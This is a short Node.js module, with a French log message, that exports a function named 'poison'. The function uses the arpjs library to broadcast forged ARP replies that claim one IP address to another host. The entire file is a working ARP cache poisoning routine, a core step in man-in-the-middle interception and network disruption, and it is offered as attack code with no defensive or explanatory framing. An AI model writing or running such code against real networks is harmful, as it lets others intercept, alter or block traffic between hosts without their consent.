const arp = require('arpjs');

exports.poison = function (ip1, ip2) {
    arp.send({
        'op': 'reply',
        'src_ip': ip1,
        'dst_ip': ip2,
        'dst_mac': 'ff:ff:ff:ff:ff:ff'
    });
    console.log(`Paquet ARP envoyé de ${ip1} à ${ip2}`);
};
